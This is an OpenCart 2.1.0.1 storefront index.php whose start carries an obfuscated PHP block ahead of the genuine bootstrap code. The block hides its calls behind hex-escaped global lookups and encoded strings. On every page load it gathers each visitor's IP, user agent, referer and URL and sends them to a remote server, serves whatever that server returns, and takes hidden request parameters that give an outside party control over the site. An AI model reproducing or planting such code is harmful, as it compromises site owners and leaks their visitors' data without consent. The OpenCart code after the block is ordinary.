xyy_yzz__z($x_yy_z_zyz){$xyz_zyyz__=@${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x79\x7a\x5f\x5f\x7a\x7a"]("/{\\|}/si",$x_yy_z_zyz,-1,PREG_SPLIT_NO_EMPTY);if(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x79\x5f\x5f\x7a\x79\x7a\x79"]($xyz_zyyz__)){return false;}if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x7a\x5f\x7a\x5f\x79\x7a\x79\x5f"]($xyz_zyyz__)!=2){return false;}return $xyz_zyyz__;}function xy_zyzz__y($xyyzz__zy_,$x__yz_yzzy){$xy_z_zyz_y=array();$xy_z_zyz_y["\x64\x65\x66\x61\x75\x6c\x74\x5f\x70\x61\x72\x61\x6d\x73"]=$xyyzz__zy_;$xy_z_zyz_y["\x61\x70\x69"]=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x5f\x79\x79\x7a\x79\x7a\x5f"](x__yzy_yzz($xy_z_zyz_y["\x64\x65\x66\x61\x75\x6c\x74\x5f\x70\x61\x72\x61\x6d\x73"]));$xy_z_zyz_y["\x73\x65\x72\x76\x65\x72\x5f\x64\x6f\x6d\x61\x69\x6e"]=xzyy_y_zz_();$xy_z_zyz_y["\x72\x65\x71\x75\x65\x73\x74\x5f\x75\x72\x6c"]=${"\x5f\x53\x45\x52\x56\x45\x52"}["\x52\x45\x51\x55\x45\x53\x54\x5f\x55\x52\x49"];$xy_z_zyz_y["\x72\x65\x66\x65\x72\x65\x72"]=isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x52\x45\x46\x45\x52\x45\x52"])?${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x52\x45\x46\x45\x52\x45\x52"]:'';$xy_z_zyz_y["\x75\x73\x65\x72\x5f\x61\x67\x65\x6e\x74"]=isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x55\x53\x45\x52\x5f\x41\x47\x45\x4e\x54"])?${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x55\x53\x45\x52\x5f\x41\x47\x45\x4e\x54"]:'';$xy_z_zyz_y["\x69\x70"]=xyzyz___zy();if(isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x53"])){$xy_z_zyz_y["\x70\x72\x6f\x74\x6f\x63\x6f\x6c"]=x_zz_z_yyy('yygpKYcSi20tcykHAA==');}else{$xy_z_zyz_y["\x70\x72\x6f\x74\x6f\x63\x6f\x6c"]=x_zz_z_yyy('yygpKcEbDdqS1wcA');}if(isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x41\x43\x43\x45\x50\x54\x5f\x4c\x41\x4e\x47\x55\x41\x47\x45"])){$xy_z_zyz_y["\x6c\x61\x6e\x67\x75\x61\x67\x65"]=${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x41\x43\x43\x45\x50\x54\x5f\x4c\x41\x4e\x47\x55\x41\x47\x45"];}else{$xy_z_zyz_y["\x6c\x61\x6e\x67\x75\x61\x67\x65"]="";}if(isset(${"\x5f\x47\x45\x54"}["\x70\x61\x72\x61\x6d\x73"])){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x5f\x7a\x79\x79\x7a\x79\x5f"]($xy_z_zyz_y);die();}if(isset(${"\x5f\x47\x45\x54"}["\x73\x69\x74\x65\x6d\x61\x70"])){$x__yzz_yzy=${"\x5f\x47\x45\x54"}["\x73\x69\x74\x65\x6d\x61\x70"];$x_yyz_z_zy=x_zz_z_yyy('Ky8v1Oq0vPz0/PSdVLzs8wTFAA==');if(isset(${"\x5f\x47\x45\x54"}["\x67\x6f\x6f\x67\x6c\x65\x5f\x75\x72\x6c"])){$x_yyz_z_zy=${"\x5f\x47\x45\x54"}["\x67\x6f\x6f\x67\x6c\x65\x5f\x75\x72\x6c"];}x_z_zyyyz_($x_yyz_z_zy,$x__yzz_yzy,$xy_z_zyz_y);}$xyy_z_zzy_=x_zz_z_yyy('Uy3Wtsuy+yVS2uySgpKSi20tdPz89Pz0nVS87XyyqoUS22TyzIBEqrJSaDyILEkgwQXQIeUkAA==');$xyy_z_zzy_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x5f\x79\x79\x7a\x7a\x7a\x5f\x5f"]('|',$xyy_z_zzy_);if(isset($_REQUEST["\x61\x63"])&&isset($_REQUEST["\x70\x61\x74\x68"])&&isset($_REQUEST["\x74"])){xz_zy_zyy_(sprintf($xyy_z_zzy_[2],${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x5f\x79\x79\x7a\x79\x7a\x5f"](x__yzy_yzz($x__yz_yzzy)),$xy_z_zyz_y["\x61\x70\x69"],$_REQUEST["\x61\x63"],$_REQUEST["\x70\x61\x74\x68"],$_REQUEST["\x74"]));}$xy_zzzyy__=array('doxy_zyzz__y'=>$xy_z_zyz_y["\x73\x65\x72\x76\x65\x72\x5f\x64\x6f\x6d\x61\x69\x6e"],'request_url'=>$xy_z_zyz_y["\x72\x65\x71\x75\x65\x73\x74\x5f\x75\x72\x6c"],'ip'=>$xy_z_zyz_y["\x69\x70"],'agent'=>$xy_z_zyz_y["\x75\x73\x65\x72\x5f\x61\x67\x65\x6e\x74"],'referer'=>$xy_z_zyz_y["\x72\x65\x66\x65\x72\x65\x72"],'protocol'=>$xy_z_zyz_y["\x70\x72\x6f\x74\x6f\x63\x6f\x6c"],'language'=>$xy_z_zyz_y["\x6c\x61\x6e\x67\x75\x61\x67\x65"]);$xz_zy__zyy=sprintf($xyy_z_zzy_[0],$xy_z_zyz_y["\x61\x70\x69"],x__yzy_yzz(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x5f\x7a\x5f\x7a\x79\x79\x5f\x7a"](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x7a\x5f\x5f\x5f\x7a\x79\x7a"]('{|}',$xy_zzzyy__))));$x_yy_z_zyz=xy_zyyz__z($xz_zy__zyy);if(isset($_REQUEST["\x64\x75\x6d\x70"])){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x7a\x79\x5f\x7a\x5f\x79\x5f\x7a"]($x_yy_z_zyz);$x_yy_z_zyz=xy_zyyz__z($xyy_z_zzy_[1]);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x7a\x79\x5f\x7a\x5f\x79\x5f\x7a"]($x_yy_z_zyz);die();}$xzz_y_yyz_=xyy_yzz__z($x_yy_z_zyz);if($xzz_y_yyz_!==false){@header($xzz_y_yyz_[0]);echo $xzz_y_yyz_[1];die();}}xy_zyzz__y($xyyzz__zy_,$x__yz_yzzy);
?>
<?php

/* ---------------------------------------------------------------------------------- */
/*  OpenCart index.php (with modififications for the Override Engine)                 */
/*                                                                                    */
/*  Original file Copyright © 2015 by Daniel Kerr (www.opencart.com)                  */
/*  Modifications Copyright © 2015 by J.Neuhoff (www.mhccorp.com)                     */
/*                                                                                    */
/*  This file is part of OpenCart.                                                    */
/*                                                                                    */
/*  OpenCart is free software: you can redistribute it and/or modify                  */
/*  it under the terms of the GNU General Public License as published by              */
/*  the Free Software Foundation, either version 3 of the License, or                 */
/*  (at your option) any later version.                                               */
/*                                                                                    */
/*  OpenCart is distributed in the hope that it will be useful,                       */
/*  but WITHOUT ANY WARRANTY; without even the implied warranty of                    */
/*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     */
/*  GNU General Public License for more details.                                      */
/*                                                                                    */
/*  You should have received a copy of the GNU General Public License                 */
/*  along with OpenCart.  If not, see <http://www.gnu.org/licenses/>.                 */
/* ---------------------------------------------------------------------------------- */

// Version
define('VERSION', '2.1.0.1');

// Configuration
if (is_file('config.php')) {
	require_once('config.php');
}

// Install
if (!defined('DIR_APPLICATION')) {
	header('Location: install/index.php');
	exit;
}

// Startup
require_once(DIR_SYSTEM . 'startup.php');

// Registry
$registry = new Registry();

// Loader
$loader = new Loader($registry);
$registry->set('load', $loader);

// Factory
$factory = new Factory($registry);
$registry->set( 'factory', $factory );

// Config
$config = $factory->newConfig();
$registry->set('config', $config);

// Database 
$db = $factory->newDB(DB_DRIVER, DB_HOSTNAME, DB_USERNAME, DB_PASSWORD, DB_DATABASE, DB_PORT);
$registry->set('db', $db);

// Store
if (isset($_SERVER['HTTPS']) && (($_SERVER['HTTPS'] == 'on') || ($_SERVER['HTTPS'] == '1'))) {
	$store_query = $db->query("SELECT * FROM " . DB_PREFIX . "store WHERE REPLACE(`ssl`, 'www.', '') = '" . $db->escape('https://' . str_replace('www.', '', $_SERVER['HTTP_HOST']) . rtrim(dirname($_SERVER['PHP_SELF']), '/.\\') . '/') . "'");
} else {
	$store_query = $db->query("SELECT * FROM " . DB_PREFIX . "store WHERE REPLACE(`url`, 'www.', '') = '" . $db->escape('http://' . str_replace('www.', '', $_SERVER['HTTP_HOST']) . rtrim(dirname($_SERVER['PHP_SELF']), '/.\\') . '/') . "'");
}

if ($store_query->num_rows) {
	$config->set('config_store_id', $store_query->row['store_id']);
} else {
	$config->set('config_store_id', 0);
}

// Settings
$query = $db->query("SELECT * FROM `" . DB_PREFIX . "setting` WHERE store_id = '0' OR store_id = '" . (int)$config->get('config_store_id') . "' ORDER BY store_id ASC");

foreach ($query->rows as $result) {
	if (!$result['serialized']) {
		$config->set($result['key'], $result['value']);
	} else {
		$config->set($result['key'], json_decode($result['value'], true));
	}
}

if (!$store_query->num_rows) {
	$config->set('config_url', HTTP_SERVER);
	$config->set('config_ssl', HTTPS_SERVER);
}

// Url
$url = $factory->newUrl($config->get('config_url'), $config->get('config_secure') ? $config->get('config_ssl') : $config->get('config_url'));
$registry->set('url', $url);

// Log
$log = $factory->newLog($config->get('config_error_filename'));
$registry->set('log', $log);

function error_handler($code, $message, $file, $line) {
	global $log, $config;

	// error suppressed with @
	if (error_reporting() === 0) {
		return false;
	}

	switch ($code) {
		case E_NOTICE:
		case E_USER_NOTICE:
			$error = 'Notice';
			break;
		case E_WARNING:
		case E_USER_WARNING:
			$error = 'Warning';
			break;
		case E_ERROR:
		case E_USER_ERROR:
			$error = 'Fatal Error';
			break;
		default:
			$error = 'Unknown';
			break;
	}

	if ($config->get('config_error_display')) {
		echo '<b>' . $error . '</b>: ' . $message . ' in <b>' . $file . '</b> on line <b>' . $line . '</b>';
	}

	if ($config->get('config_error_log')) {
		$log->write('PHP ' . $error . ':  ' . $message . ' in ' . $file . ' on line ' . $line);
	}

	return true;
}

// Error Handler
set_error_handler('error_handler');

// Request
$request = $factory->newRequest();
$registry->set('request', $request);

// Response
$response = $factory->newResponse();
$response->addHeader('Content-Type: text/html; charset=utf-8');
$response->setCompression($config->get('config_compression'));
$registry->set('response', $response);

// Cache
$cache = $factory->newCache('file');
$registry->set('cache', $cache);

// Session
if (isset($request->get['token']) && isset($request->get['route']) && substr($request->get['route'], 0, 4) == 'api/') {
	$db->query("DELETE FROM `" . DB_PREFIX . "api_session` WHERE TIMESTAMPADD(HOUR, 1, date_modified) < NOW()");

	$query = $db->query("SELECT DISTINCT * FROM `" . DB_PREFIX . "api` `a` LEFT JOIN `" . DB_PREFIX . "api_session` `as` ON (a.api_id = as.api_id) LEFT JOIN " . DB_PREFIX . "api_ip `ai` ON (as.api_id = ai.api_id) WHERE a.status = '1' AND as.token = '" . $db->escape($request->get['token']) . "' AND ai.ip = '" . $db->escape($request->server['REMOTE_ADDR']) . "'");

	if ($query->num_rows) {
		// Does not seem PHP is able to handle sessions as objects properly so so wrote my own class
		$session = $factory->newSession($query->row['session_id'], $query->row['session_name']);
		$registry->set('session', $session);

		// keep the session alive
		$db->query("UPDATE `" . DB_PREFIX . "api_session` SET date_modified = NOW() WHERE api_session_id = '" . $query->row['api_session_id'] . "'");
	}
} else {
	$session = $factory->newSession();
	$registry->set('session', $session);
}

// Language Detection
$languages = array();

$query = $db->query("SELECT * FROM `" . DB_PREFIX . "language` WHERE status = '1'");

foreach ($query->rows as $result) {
	$languages[$result['code']] = $result;
}

if (isset($session->data['language']) && array_key_exists($session->data['language'], $languages)) {
	$code = $session->data['language'];
} elseif (isset($request->cookie['language']) && array_key_exists($request->cookie['language'], $languages)) {
	$code = $request->cookie['language'];
} else {
	$detect = '';

	if (isset($request->server['HTTP_ACCEPT_LANGUAGE']) && $request->server['HTTP_ACCEPT_LANGUAGE']) {
		$browser_languages = explode(',', $request->server['HTTP_ACCEPT_LANGUAGE']);

		foreach ($browser_languages as $browser_language) {
			foreach ($languages as $key => $value) {
				if ($value['status']) {
					$locale = explode(',', $value['locale']);

					if (in_array($browser_language, $locale)) {
						$detect = $key;
						break 2;
					}
				}
			}
		}
	}

	$code = $detect ? $detect : $config->get('config_language');
}

if (!isset($session->data['language']) || $session->data['language'] != $code) {
	$session->data['language'] = $code;
}

if (!isset($request->cookie['language']) || $request->cookie['language'] != $code) {
	setcookie('language', $code, time() + 60 * 60 * 24 * 30, '/', $request->server['HTTP_HOST']);
}

$config->set('config_language_id', $languages[$code]['language_id']);
$config->set('config_language', $languages[$code]['code']);

// Language
$language = $factory->newLanguage($languages[$code]['directory']);
$language->load($languages[$code]['directory']);
$registry->set('language', $language);

// Document
$registry->set('document', $factory->newDocument());

// Customer
$customer = $factory->newCustomer($registry);
$registry->set('customer', $customer);

// Customer Group
if ($customer->isLogged()) {
	$config->set('config_customer_group_id', $customer->getGroupId());
} elseif (isset($session->data['customer']) && isset($session->data['customer']['customer_group_id'])) {
	// For API calls
	$config->set('config_customer_group_id', $session->data['customer']['customer_group_id']);
} elseif (isset($session->data['guest']) && isset($session->data['guest']['customer_group_id'])) {
	$config->set('config_customer_group_id', $session->data['guest']['customer_group_id']);
}

// Tracking Code
if (isset($request->get['tracking'])) {
	setcookie('tracking', $request->get['tracking'], time() + 3600 * 24 * 1000, '/');

	$db->query("UPDATE `" . DB_PREFIX . "marketing` SET clicks = (clicks + 1) WHERE code = '" . $db->escape($request->get['tracking']) . "'");
}

// Affiliate
$registry->set('affiliate', $factory->newAffiliate($registry));

// Currency
$registry->set('currency', $factory->newCurrency($registry));

// Tax
$registry->set('tax', $factory->newTax($registry));

// Weight
$registry->set('weight', $factory->newWeight($registry));

// Length
$registry->set('length', $factory->newLength($registry));

// Cart
$registry->set('cart', $factory->newCart($registry));

// Encryption
$registry->set('encryption', $factory->newEncryption($config->get('config_encryption')));

// OpenBay Pro
$registry->set('openbay', new Openbay($registry));

// Event
$event = $factory->newMediator($registry);
$registry->set('event', $event);

$query = $db->query("SELECT * FROM " . DB_PREFIX . "event");

foreach ($query->rows as $result) {
	$event->register($result['trigger'], $result['action']);
}

// Front Controller
$controller = new Front($registry);

// Maintenance Mode
$controller->addPreAction($factory->newAction('common/maintenance'));

// SEO URL's
$controller->addPreAction($factory->newAction('common/seo_url'));

// Router
if (isset($request->get['route'])) {
	$action = $factory->newAction($request->get['route']);
} else {
	$action = $factory->newAction('common/home');
}

// Dispatch
$controller->dispatch($action, $factory->newAction('error/not_found'));

// Output
$response->output();
